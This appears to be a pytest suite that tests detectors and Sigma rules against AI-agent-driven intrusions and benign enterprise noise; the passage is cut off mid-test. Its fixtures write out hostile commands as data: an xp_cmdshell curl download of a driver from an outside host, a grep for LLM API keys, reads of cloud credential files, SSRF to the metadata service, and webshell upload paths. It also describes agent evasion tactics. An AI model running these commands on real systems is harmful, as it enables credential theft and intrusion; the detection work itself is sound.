"""Adversarial mutation & production sniff-test regression suite.

Proves two things simultaneously:
1. All 6 trivial attacker mutations (bucket-boundary straddling, rotating residential proxies,
   shell-wrapped/Linux commands, REST child-ID write->readback, mutated LLM canaries, and
   compacted sawtooth context resets) are STILL caught.
2. Realistic production enterprise noise traps (AbnormalSecurity UA, Normalizer.exe, Jenkins
   java->bash gradle build, normal e-commerce POST /cart -> GET /cart, laptop LLM usage)
   produce ZERO false positives across both detectors.py and Sigma rules.
"""

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import yaml

from artex_defense.detectors import scan_telemetry_file
from artex_defense.eval_harness import evaluate_sigma_rule_on_events

RULES_DIR = Path(__file__).resolve().parent.parent / "rules" / "sigma"


def _write_jsonl(path: Path, events: list[dict]) -> Path:
    path.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
    return path


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def test_mutation_1_bucket_boundary_straddling_sawtooth_caught(tmp_path: Path) -> None:
    """Attacker starts at :01:35 and spaces turns 25s apart (125s span crossing multiple 120s boundaries)."""
    t = datetime(2026, 11, 20, 14, 1, 35, tzinfo=timezone.utc)
    events = []
    for b_out, b_in in [
        (3600, 1900),
        (8200, 2200),
        (15400, 2700),
        (26100, 3100),
        (39800, 3400),
        (54200, 2900),
    ]:
        events.append(
            {
                "timestamp": _iso(t),
                "source_host": "srv-api-03",
                "actor": "svc-worker",
                "event_type": "http",
                "surface": "network",
                "dest_host": "cdn-edge-12.example-vps.net",
                "dest_port": 443,
                "http_method": "POST",
                "http_path": "/v2/telemetry",
                "user_agent": "Mozilla/5.0 Chrome/131.0",
                "bytes_out": b_out,
                "bytes_in": b_in,
                "status_code": 200,
            }
        )
        t += timedelta(seconds=25)

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "mut1_straddle.jsonl", events))
    assert cands and "llm_sawtooth_context_flow" in cands[0].reasons


def test_mutation_2_rotating_residential_proxy_pool_caught(tmp_path: Path) -> None:
    """Attacker rotates 6 distinct source IPs (1 request per IP) against the same Citrix/VPN gateway."""
    t = datetime(2026, 11, 20, 15, 0, 0, tzinfo=timezone.utc)
    paths = [
        "/vpn/index.html",
        "/nf/auth/doAuthentication.do",
        "/logon/LogonPoint/index.html",
        "/vpn/tmindex.html",
        "/p/u/getAuthenticationRequirements.do",
        "/nf/auth/startwebview.do",
    ]
    events = []
    for idx, path in enumerate(paths):
        events.append(
            {
                "timestamp": _iso(t + timedelta(seconds=idx * 4)),
                "source_host": f"198.51.100.{50 + idx}",
                "actor": f"198.51.100.{50 + idx}",
                "event_type": "edge_auth",
                "surface": "edge_appliance",
                "appliance": "citrix_netscaler",
                "dest_host": "adc-gw-01.corp.local",
                "dest_port": 443,
                "http_method": "POST",
                "http_path": path,
                "user_agent": "Mozilla/5.0 Chrome/131.0",
                "status_code": 403,
            }
        )

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "mut2_proxy_pool.jsonl", events))
    reasons = {r for c in cands for r in c.reasons}
    assert "distributed_proxy_pool_probe" in reasons


def test_mutation_3_shell_wrapped_linux_redundant_recon_caught(tmp_path: Path) -> None:
    """Workers wrap Linux recon in `bash -c "... 2>&1"` to evade exact command matching."""
    t = datetime(2026, 11, 20, 16, 0, 0, tzinfo=timezone.utc)
    cmds = [
        'bash -c "id -a 2>&1"',
        'sh -c "ip addr 2>/dev/null"',
        'bash -c "id -a"',
        'bash -lc "ip addr 2>&1"',
        'sh -c "id -a | head -n 20"',
    ]
    events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 12)),
            "source_host": "app-lin-09",
            "actor": "www-data",
            "event_type": "process",
            "surface": "endpoint",
            "process": "bash",
            "parent_process": "sshd",
            "command_line": cmd,
            "status_code": 0,
        }
        for i, cmd in enumerate(cmds)
    ]

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "mut3_wrapped_linux.jsonl", events))
    assert cands and "multi_worker_redundant_recon" in cands[0].reasons


def test_mutation_4_rest_child_id_write_then_readback_caught(tmp_path: Path) -> None:
    """POST /api/v1/documents followed 1.5s later by GET /api/v1/documents/42 (and second query-param readback)."""
    t = datetime(2026, 11, 20, 17, 0, 0, tzinfo=timezone.utc)
    seq = [
        (0, "POST", "/api/v1/documents", 201),
        (1.5, "GET", "/api/v1/documents/42", 200),
        (15, "PUT", "/api/v1/settings/policy", 200),
        (16.2, "GET", "/api/v1/settings/policy?verify=1", 200),
    ]
    events = [
        {
            "timestamp": _iso(t + timedelta(seconds=offset)),
            "source_host": "198.51.100.180",
            "actor": "api-client-9",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "api.corp.local",
            "http_method": m,
            "http_path": p,
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": code,
        }
        for offset, m, p, code in seq
    ]

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "mut4_rest_readback.jsonl", events))
    assert cands and "write_then_readback_verification" in cands[0].reasons


def test_mutation_5_mutated_llm_canary_stems_caught(tmp_path: Path) -> None:
    """Attacker drops zzq and lets LLM invent different negative-control probe names."""
    t = datetime(2026, 11, 20, 18, 0, 0, tzinfo=timezone.utc)
    events = [
        {
            "timestamp": _iso(t),
            "source_host": "198.51.100.190",
            "actor": "fake_user_91a",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "portal.corp.local",
            "http_method": "POST",
            "http_path": "/auth/login?user=no_such_acct_91a",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 401,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=6)),
            "source_host": "198.51.100.190",
            "actor": "fake_user_91a",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "portal.corp.local",
            "http_method": "GET",
            "http_path": "/does_not_exist_probe_4421",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 404,
        },
    ]

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "mut5_canary.jsonl", events))
    assert cands and "unit42_agentic_canary_probe" in cands[0].reasons


def test_mutation_6_compacted_sawtooth_context_reset_caught(tmp_path: Path) -> None:
    """Agent compacts context after 3 turns (climb -> sharp drop -> climb) to avoid 4-turn monotonic runs."""
    t = datetime(2026, 11, 20, 19, 0, 0, tzinfo=timezone.utc)
    # Climb 1: 4KB -> 9KB -> 15KB (3 turns, ratio 3.75x) -> Compaction drop to 4.5KB -> Climb 2: 4.5KB -> 10KB -> 16.5KB
    pairs = [
        (4000, 1800),
        (9200, 2100),
        (15100, 2500),
        (4500, 1400),
        (10200, 2200),
        (16500, 2800),
    ]
    events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 10)),
            "source_host": "srv-worker-04",
            "actor": "deploy",
            "event_type": "http",
            "surface": "network",
            "dest_host": "sync-relay.example-vps.net",
            "dest_port": 443,
            "http_method": "POST",
            "http_path": "/events",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "bytes_out": b_out,
            "bytes_in": b_in,
            "status_code": 200,
        }
        for i, (b_out, b_in) in enumerate(pairs)
    ]

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "mut6_compacted.jsonl", events))
    assert cands and "llm_sawtooth_context_flow" in cands[0].reasons


def test_production_sniff_test_noise_traps_produce_zero_fps(tmp_path: Path) -> None:
    """Real enterprise noise (AbnormalSecurity UA, Normalizer.exe, java->bash gradle, POST /cart->GET /cart) = 0 FPs."""
    t = datetime(2026, 11, 20, 20, 0, 0, tzinfo=timezone.utc)
    noise_events = [
        # 1. AbnormalSecurity / Normalizer UAs (previously risked matching bare 'norma')
        {
            "timestamp": _iso(t),
            "source_host": "10.50.1.10",
            "actor": "abnormal-sync",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "mailgw.corp.local",
            "http_method": "GET",
            "http_path": "/api/health",
            "user_agent": "AbnormalSecurity-Connector/3.2 (normal-sync)",
            "status_code": 200,
        },
        # 2. Normalizer.exe / SmartExchange.exe (previously risked matching bare 'norma' / 'artex')
        {
            "timestamp": _iso(t + timedelta(seconds=15)),
            "source_host": "WKSTN-FIN-22",
            "actor": "jmartin",
            "event_type": "network",
            "surface": "endpoint",
            "process": "C:\\Program Files\\Vendor\\Normalizer.exe",
            "dest_host": "smartex.corp.local",
            "dest_port": 443,
            "status_code": 200,
        },
        # 3. Jenkins java spawning bash for a normal Gradle build (must NOT trigger web_parent_shell_spawn)
        {
            "timestamp": _iso(t + timedelta(seconds=30)),
            "source_host": "ci-jenkins-01",
            "actor": "jenkins",
            "event_type": "process",
            "surface": "endpoint",
            "process": "/bin/bash",
            "parent_process": "/usr/lib/jvm/java-21/bin/java",
            "command_line": "bash -c './gradlew clean test --no-daemon'",
            "status_code": 0,
        },
        # 4. Normal browser POST /cart -> GET /cart (must NOT trigger write_then_readback_verification)
        {
            "timestamp": _iso(t + timedelta(seconds=45)),
            "source_host": "198.51.100.77",
            "actor": "shopper-01",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "shop.corp.local",
            "http_method": "POST",
            "http_path": "/cart",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 200,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=46)),
            "source_host": "198.51.100.77",
            "actor": "shopper-01",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "shop.corp.local",
            "http_method": "GET",
            "http_path": "/cart",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 200,
        },
    ]

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "prod_noise.jsonl", noise_events))
    assert cands == [], f"Production noise traps triggered false positives: {cands}"

    # Verify ZERO Sigma rules fire on these production noise events (plus a developer laptop hitting api.openai.com)
    sigma_noise = list(noise_events) + [
        {
            "timestamp": _iso(t + timedelta(seconds=60)),
            "source_host": "LAPTOP-ENG-412",
            "actor": "dev-alex",
            "event_type": "dns",
            "surface": "network",
            "dest_host": "api.openai.com",
            "status_code": 200,
        }
    ]
    for rule_path in sorted(RULES_DIR.glob("*.yml")):
        doc = yaml.safe_load(rule_path.read_text(encoding="utf-8"))
        hits = evaluate_sigma_rule_on_events(doc, sigma_noise)
        assert hits == 0, f"Sigma rule {rule_path.name} falsely fired {hits}x on production noise traps!"


def test_rba_and_blind_chaos_regressions_cloud_ssrf_c2_and_nat(tmp_path: Path) -> None:
    """Verify blind-chaos discoveries: SP fail->vault, SSRF+upload shell, REST cloud IAM, and NAT/laptop 0-FP."""
    t = datetime(2026, 11, 20, 21, 0, 0, tzinfo=timezone.utc)

    # 1. Corporate NAT gateway: 1 shared IP, 4 distinct real browsers (4 UAs + 4 JA4s), 0 errors -> MUST be 0 FP
    nat_events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 10)),
            "source_host": "198.51.100.10",
            "actor": "198.51.100.10",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "portal.corp.local",
            "http_method": "GET",
            "http_path": f"/page/{i}",
            "user_agent": ua,
            "ja4": f"t13d1516h2_nat{i}aaaa1111_e5627efa2ab{i}",
            "status_code": 200,
        }
        for i, ua in enumerate(
            [
                "Mozilla/5.0 Chrome/131.0",
                "Mozilla/5.0 Firefox/132.0",
                "Mozilla/5.0 Safari/605.1.15",
                "Mozilla/5.0 Edg/131.0",
            ]
        )
    ]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "nat_clean.jsonl", nat_events)) == []

    # 2. Azure SP 401 fail -> 200 success -> Key Vault / SAS profiling -> alert tier
    sp_events = [
        {
            "timestamp": _iso(t),
            "source_host": "192.0.2.50",
            "actor": "sp-sync",
            "event_type": "authentication_failure",
            "surface": "cloud_iam",
            "dest_host": "login.microsoftonline.com",
            "http_method": "POST",
            "http_path": "/oauth2/v2.0/token",
            "status_code": 401,
            "action": "denied",
        },
        {
            "timestamp": _iso(t + timedelta(seconds=10)),
            "source_host": "192.0.2.50",
            "actor": "sp-sync",
            "event_type": "authentication_success",
            "surface": "cloud_iam",
            "dest_host": "login.microsoftonline.com",
            "http_method": "POST",
            "http_path": "/oauth2/v2.0/token",
            "status_code": 200,
            "action": "allowed",
        },
        {
            "timestamp": _iso(t + timedelta(seconds=15)),
            "source_host": "192.0.2.50",
            "actor": "sp-sync",
            "event_type": "api_call",
            "surface": "cloud_iam",
            "dest_host": "vault-prod.vault.azure.net",
            "http_method": "GET",
            "http_path": "/secrets/db-pass?api-version=7.0",
            "status_code": 200,
            "action": "allowed",
        },
    ]
    sp_cands = scan_telemetry_file(_write_jsonl(tmp_path / "sp_vault.jsonl", sp_events))
    assert sp_cands and "cloud_sp_fail_to_vault_pivot" in sp_cands[0].reasons
    assert sp_cands[0].alert_tier == "alert" and sp_cands[0].risk_score >= 80

    # 3. Web SSRF metadata + upload PHP webshell -> alert tier
    ssrf_events = [
        {
            "timestamp": _iso(t),
            "source_host": "198.51.100.12",
            "actor": "anonymous",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "web-01.corp.local",
            "http_method": "GET",
            "http_path": "/api/proxy?url=http://169.254.169.254/latest/meta-data/",
            "status_code": 200,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=8)),
            "source_host": "198.51.100.12",
            "actor": "anonymous",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "web-01.corp.local",
            "http_method": "POST",
            "http_path": "/uploads/cache.php",
            "status_code": 200,
        },
    ]
    ssrf_cands = scan_telemetry_file(_write_jsonl(tmp_path / "ssrf_shell.jsonl", ssrf_events))
    assert ssrf_cands and "web_ssrf_or_upload_webshell" in ssrf_cands[0].reasons
    assert ssrf_cands[0].alert_tier == "alert"

    # 4. Scanner IP/CIDR allowlist vs spoofed QualysGuard UA from external IP
    scanner_events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 2)),
            "source_host": "10.0.5.20",
            "actor": "scanner",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "web-01.corp.local",
            "http_method": "GET",
            "http_path": f"/probe/{i}",
            "user_agent": "QualysGuard/1.0",
            "status_code": 404,
        }
        for i in range(10)
    ]
    scanner_file = _write_jsonl(tmp_path / "scanner.jsonl", scanner_events)
    # Without IP allowlist (e.g. attacker spoofing QualysGuard/1.0), volumetric burst MUST fire (hunt/info)
    assert len(scan_telemetry_file(scanner_file)) == 1
    # With operator-configured internal scanner CIDR allowlist, generic burst is cleanly suppressed
    assert scan_telemetry_file(scanner_file, authorized_scanner_ips=["10.0.5.0/24"]) == []


def test_huntio_and_threatdefence_signals_detected(tmp_path: Path) -> None:
    """Verify Hunt.io + ThreatDefence intel additions: JWT alg:none, xp_cmdshell/WinRing0, Kudu/Cognito, shim & :8890."""
    t = datetime(2026, 11, 21, 0, 15, 0, tzinfo=timezone.utc)
    events = [
        {
            "timestamp": _iso(t),
            "source_host": "198.51.100.230",
            "actor": "sso-probe",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "sso.corp.local",
            "http_method": "GET",
            "http_path": "/sso/callback?token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "status_code": 401,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=10)),
            "source_host": "srv-sql-09",
            "actor": "mssql",
            "event_type": "process",
            "surface": "endpoint",
            "process": "sqlservr.exe",
            "command_line": "EXEC xp_cmdshell 'curl http://ftp.vietnam852.com:88/test/WinRing0x64.sys'",
            "dest_host": "ftp.vietnam852.com",
            "status_code": 0,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=20)),
            "source_host": "relay-hk-01",
            "actor": "root",
            "event_type": "network",
            "surface": "network",
            "command_line": "python3 xcai-effort-shim.py",
            "dest_host": "38.244.50.120",
            "dest_port": 8890,
            "status_code": 200,
        },
    ]
    cands = scan_telemetry_file(_write_jsonl(tmp_path / "hunt_td.jsonl", events))
    reasons = {r for c in cands for r in c.reasons}
    assert "jwt_alg_none_spray" in reasons
    assert "post_exploit_ad_or_followon_c2" in reasons
    assert "known_artex_artifact" in reasons
    assert "agentic_default_port" in reasons


def test_antifox_aws_access_denied_sweep_to_secret_read_detected(tmp_path: Path) -> None:
    """Verify Arctic Wolf AntiFox pattern: Boto3 multi-service AWS AccessDenied burst -> GetSecretValue 200."""
    t = datetime(2026, 11, 21, 11, 20, 0, tzinfo=timezone.utc)
    denied_actions = [
        ("iam.amazonaws.com", "ListUsers"),
        ("ec2.amazonaws.com", "DescribeInstances"),
        ("kms.amazonaws.com", "ListKeys"),
        ("bedrock.us-east-1.amazonaws.com", "ListFoundationModels"),
        ("rds.amazonaws.com", "DescribeDBInstances"),
    ]
    events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 3)),
            "source_host": "47.88.10.22",
            "actor": "arn:aws:iam::111122223333:user/web-app-key",
            "event_type": "cloud_iam",
            "surface": "cloud_iam",
            "dest_host": host,
            "user_agent": "Boto3/1.43.125 Python/3.12",
            "action": act,
            "status_code": 403,
        }
        for i, (host, act) in enumerate(denied_actions)
    ] + [
        {
            "timestamp": _iso(t + timedelta(seconds=20)),
            "source_host": "47.88.10.22",
            "actor": "arn:aws:iam::111122223333:user/web-app-key",
            "event_type": "cloud_iam",
            "surface": "cloud_iam",
            "dest_host": "secretsmanager.us-east-1.amazonaws.com",
            "user_agent": "Boto3/1.43.125 Python/3.12",
            "action": "GetSecretValue",
            "status_code": 200,
        }
    ]
    cands = scan_telemetry_file(_write_jsonl(tmp_path / "antifox_aws.jsonl", events))
    assert cands and "cloud_secret_search_or_dryrun_burst" in cands[0].reasons
    assert cands[0].alert_tier == "alert"


def test_web_error_handling_calibration_multi_code_and_random_slug_caught(tmp_path: Path) -> None:
    """Verify agents forcing error codes (404/405/422/500) or random-slug soft-404s without zzq are caught."""
    t = datetime(2026, 11, 21, 12, 20, 0, tzinfo=timezone.utc)

    # A. Multi-error-class forcing to harvest framework stack traces / verb handling (404 + 405 + 500)
    multi_err_events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 4)),
            "source_host": "198.51.100.241",
            "actor": "198.51.100.241",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "app.corp.local",
            "http_method": m,
            "http_path": p,
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": code,
        }
        for i, (m, p, code) in enumerate(
            [
                ("GET", "/missing-route", 404),
                ("PUT", "/api/v1/status", 405),
                ("POST", "/api/v1/items", 500),
            ]
        )
    ]
    cands_a = scan_telemetry_file(_write_jsonl(tmp_path / "err_cal_multi.jsonl", multi_err_events))
    assert cands_a and "web_error_handling_calibration" in cands_a[0].reasons
    assert cands_a[0].alert_tier == "alert"

    # B. Keyword-free high-entropy random-slug control-404 / soft-404 calibration (zero zzq/nonexistent!)
    slug_events = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 5)),
            "source_host": "198.51.100.242",
            "actor": "198.51.100.242",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "app.corp.local",
            "http_method": "GET",
            "http_path": p,
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": code,
        }
        for i, (p, code) in enumerate(
            [
                ("/k9x2m8q4p1", 404),
                ("/a7f3b9c2e1.php", 404),
                ("/x8v4n2w9q3.json", 200),  # soft-404!
            ]
        )
    ]
    cands_b = scan_telemetry_file(_write_jsonl(tmp_path / "err_cal_slugs.jsonl", slug_events))
    assert cands_b and "web_error_handling_calibration" in cands_b[0].reasons
    assert cands_b[0].alert_tier == "alert"


def test_benign_uuid_404s_and_single_error_class_produce_zero_fps(tmp_path: Path) -> None:
    """Normal users hitting UUID 404s + static asset 404s + a single 401 must NOT trigger error calibration."""
    t = datetime(2026, 11, 21, 12, 25, 0, tzinfo=timezone.utc)
    benign = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 8)),
            "source_host": "198.51.100.90",
            "actor": "user-norm",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "app.corp.local",
            "http_method": "GET",
            "http_path": p,
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": code,
        }
        for i, (p, code) in enumerate(
            [
                ("/api/orders/550e8400-e29b-41d4-a716-446655440000", 404),
                ("/api/orders/660e8400-e29b-41d4-a716-446655440001", 404),
                ("/api/orders/770e8400-e29b-41d4-a716-446655440002", 404),
                ("/favicon.ico", 404),
                ("/assets/bundle.js", 404),
                ("/dashboard", 200),
            ]
        )
    ]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_uuid_404.jsonl", benign)) == []


def test_amazon_madpot_llm_api_key_harvesting_caught(tmp_path: Path) -> None:
    """Amazon MadPot Nov 2026: self-funding agent scraping env/files for AI model API keys."""
    t = datetime(2026, 11, 21, 13, 10, 0, tzinfo=timezone.utc)
    attack = [
        {
            "timestamp": _iso(t),
            "source_host": "app-srv-09",
            "actor": "www-data",
            "event_type": "process",
            "surface": "endpoint",
            "process": "grep",
            "parent_process": "bash",
            "command_line": "grep -rnE 'OPENAI_API_KEY|ANTHROPIC_API_KEY|sk-ant-' /srv/app/.env /home/*/.bash_history",
            "action": "process_create",
        }
    ]
    cands = scan_telemetry_file(_write_jsonl(tmp_path / "madpot_key_harvest.jsonl", attack))
    assert cands and "llm_api_key_harvesting" in cands[0].reasons
    assert cands[0].alert_tier == "alert" and cands[0].risk_score >= 80


def test_server_callback_to_probing_ip_caught_zero_ioc(tmp_path: Path) -> None:
    """Zero-IOC cross-direction correlation: external IP probes server -> server calls back to that exact IP."""
    t = datetime(2026, 11, 21, 13, 30, 0, tzinfo=timezone.utc)
    events = [
        {
            "timestamp": _iso(t),
            "source_host": "203.0.113.88",
            "actor": "203.0.113.88",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "web-dmz-04",
            "http_method": "POST",
            "http_path": "/api/render",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 200,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=18)),
            "source_host": "web-dmz-04",
            "actor": "www-data",
            "event_type": "network",
            "surface": "network",
            "dest_host": "203.0.113.88",
            "dest_port": 4444,
            "action": "outbound_connect",
        },
    ]
    cands = scan_telemetry_file(_write_jsonl(tmp_path / "server_callback.jsonl", events))
    cb = [c for c in cands if "agentic_server_callback_on_probe" in c.reasons]
    assert cb and cb[0].alert_tier == "alert" and cb[0].risk_score >= 90

    # Benign control: web server connecting to an unrelated upstream API/CDN must NOT trigger callback
    benign = [
        events[0],
        {
            "timestamp": _iso(t + timedelta(seconds=18)),
            "source_host": "web-dmz-04",
            "actor": "www-data",
            "event_type": "network",
            "surface": "network",
            "dest_host": "cdn.corp-static.example",
            "dest_port": 443,
            "action": "outbound_connect",
        },
    ]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_outbound.jsonl", benign)) == []


def test_smb_winrm_lateral_fanout_and_hermes_cli_uas_caught(tmp_path: Path) -> None:
    """Rapid SMB/WinRM lateral fan-out across >=4 hosts + Hermes/Qwen-Code/Kimi-CLI UAs caught with 0 benign FPs."""
    t = datetime(2026, 11, 21, 13, 35, 0, tzinfo=timezone.utc)
    lateral_attack = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 3)),
            "source_host": "app-srv-02",
            "actor": "svc-iis",
            "event_type": "network",
            "surface": "network",
            "dest_host": f"10.10.20.{10 + i}",
            "dest_port": 5985 if i % 2 == 0 else 445,
            "action": "tcp_connect",
        }
        for i in range(5)
    ]
    cands_lat = scan_telemetry_file(_write_jsonl(tmp_path / "lateral_fanout.jsonl", lateral_attack))
    lat = [c for c in cands_lat if "agentic_lateral_fanout_smb_winrm" in c.reasons]
    assert lat and lat[0].alert_tier == "alert" and lat[0].risk_score >= 80

    # Benign control: normal admin connecting to 2 SMB shares must NOT trigger lateral fan-out
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_smb.jsonl", lateral_attack[:2])) == []

    # Model-agnostic CLI User-Agents (qwen-code/, kimi-cli/, opencode/, hermes-agent/)
    ua_ev = [
        {
            "timestamp": _iso(t),
            "source_host": "198.51.100.77",
            "actor": "198.51.100.77",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "portal.corp.local",
            "http_method": "GET",
            "http_path": "/api/v1/health",
            "user_agent": "qwen-code/1.2.0",
            "status_code": 200,
        }
    ]
    cands_ua = scan_telemetry_file(_write_jsonl(tmp_path / "qwen_code_ua.jsonl", ua_ev))
    assert cands_ua and "agentic_user_agent_burst" in cands_ua[0].reasons


def test_fork_agnostic_blindspot_pivots_caught_with_zero_benign_fps(tmp_path: Path) -> None:
    """Verify all 4 fork-agnostic blind-spot pivots + hard benign controls (Terraform, CDN DNS, normal GraphQL, single .env)."""
    t = datetime(2026, 11, 21, 13, 40, 0, tzinfo=timezone.utc)

    # 1. Stolen VALID cloud admin key: 100% 200 OK (0 AccessDenied!) across 6 AWS services in 20s
    stolen_valid_key = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 3)),
            "source_host": "198.51.100.180",
            "actor": "arn:aws:iam::111122223333:user/prod-deployer",
            "event_type": svc,
            "surface": "cloud_iam",
            "dest_host": f"{svc}.amazonaws.com",
            "user_agent": "Boto3/1.35.0 Python/3.12",
            "status_code": 200,
            "action": act,
        }
        for i, (svc, act) in enumerate(
            [
                ("sts", "GetCallerIdentity"),
                ("iam", "ListRoles"),
                ("secretsmanager", "ListSecrets"),
                ("s3", "ListBuckets"),
                ("ec2", "DescribeInstances"),
                ("bedrock", "ListFoundationModels"),
            ]
        )
    ]
    c1 = scan_telemetry_file(_write_jsonl(tmp_path / "stolen_valid_key.jsonl", stolen_valid_key))
    assert any("cloud_stolen_key_multi_service_enum" in c.reasons for c in c1)

    # Benign control 1: Terraform IaC running the same 200 OK read sweep must produce 0 FPs
    tf_benign = [{**ev, "user_agent": "HashiCorp Terraform/1.9.5"} for ev in stolen_valid_key]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "terraform_benign.jsonl", tf_benign)) == []

    # 2. Custom-domain high-entropy OOB DNS callback <=90s after web probe
    oob_dns = [
        {
            "timestamp": _iso(t),
            "source_host": "203.0.113.155",
            "actor": "203.0.113.155",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "api-gw-03",
            "http_method": "POST",
            "http_path": "/v2/import",
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 200,
        },
        {
            "timestamp": _iso(t + timedelta(seconds=11)),
            "source_host": "api-gw-03",
            "actor": "www-data",
            "event_type": "dns_query",
            "surface": "network",
            "dest_host": "a9f3c2d81e04b7.oob-collector.example",
            "dest_port": 53,
            "action": "dns_lookup",
        },
    ]
    c2 = scan_telemetry_file(_write_jsonl(tmp_path / "oob_dns.jsonl", oob_dns))
    assert any("dns_oob_callback_after_probe" in c.reasons for c in c2)

    # Benign control 2: AWS/CloudFront hex-looking domain lookup after web request must NOT FP
    benign_cdn_dns = [
        oob_dns[0],
        {**oob_dns[1], "dest_host": "d111111abcdef8.cloudfront.net"},
    ]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_cdn_dns.jsonl", benign_cdn_dns)) == []

    # 3. GraphQL introspection followed by mutation/API probes + AI/MCP endpoint discovery
    gql_attack = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 4)),
            "source_host": "198.51.100.181",
            "actor": "198.51.100.181",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "api.corp.local",
            "http_method": "POST",
            "http_path": p,
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": code,
        }
        for i, (p, code) in enumerate(
            [
                ("/graphql?query={__schema{types{name}}}", 200),
                ("/graphql?op=listUsers", 403),
                ("/graphql?op=exportKeys", 403),
            ]
        )
    ]
    c3 = scan_telemetry_file(_write_jsonl(tmp_path / "gql_probe.jsonl", gql_attack))
    assert any("graphql_or_ai_mcp_discovery_probe" in c.reasons for c in c3)

    # Benign control 3: Normal POST /graphql app queries without __schema must produce 0 FPs
    benign_gql = [
        {**gql_attack[0], "http_path": "/graphql", "status_code": 200},
        {**gql_attack[1], "http_path": "/graphql", "status_code": 200},
    ]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_gql.jsonl", benign_gql)) == []

    # 4. Config & credential file harvest burst (>=3 distinct sensitive files in <=45s)
    harvest = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 5)),
            "source_host": "web-app-07",
            "actor": "www-data",
            "event_type": "process",
            "surface": "endpoint",
            "process": "cat",
            "parent_process": "sh",
            "command_line": cmd,
            "action": "process_create",
        }
        for i, cmd in enumerate(
            [
                "cat /srv/app/.env",
                "cat /home/deploy/.aws/credentials",
                "cat /home/deploy/.kube/config",
            ]
        )
    ]
    c4 = scan_telemetry_file(_write_jsonl(tmp_path / "config_harvest.jsonl", harvest))
    assert any("config_and_secret_file_harvest_burst" in c.reasons for c in c4)

    # Benign control 4: Single app reading its own .env file must produce 0 FPs
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_single_env.jsonl", [harvest[0]])) == []


def test_cms_upload_filter_bypass_and_ad_pivot_tradecraft_caught_with_zero_fps(tmp_path: Path) -> None:
    """Verify CMS .phar/.pht/.htaccess upload bypasses, relocated DLL sideloading, Chisel/NTLM relay, and /tmp gcc."""
    t = datetime(2026, 11, 21, 14, 45, 0, tzinfo=timezone.utc)

    # 1. Drupal /sites/default/files/ .phar / .htaccess upload bypass
    cms_bypass = [
        {
            "timestamp": _iso(t + timedelta(seconds=i * 2)),
            "source_host": "203.0.113.190",
            "actor": "203.0.113.190",
            "event_type": "http",
            "surface": "web_portal",
            "dest_host": "cms.corp.local",
            "http_method": "PUT",
            "http_path": p,
            "user_agent": "Mozilla/5.0 Chrome/131.0",
            "status_code": 200,
        }
        for i, p in enumerate(
            [
                "/sites/default/files/test_probe.phar",
                "/sites/default/files/sub/.htaccess",
                "/sites/default/files/sub/run.pht",
            ]
        )
    ]
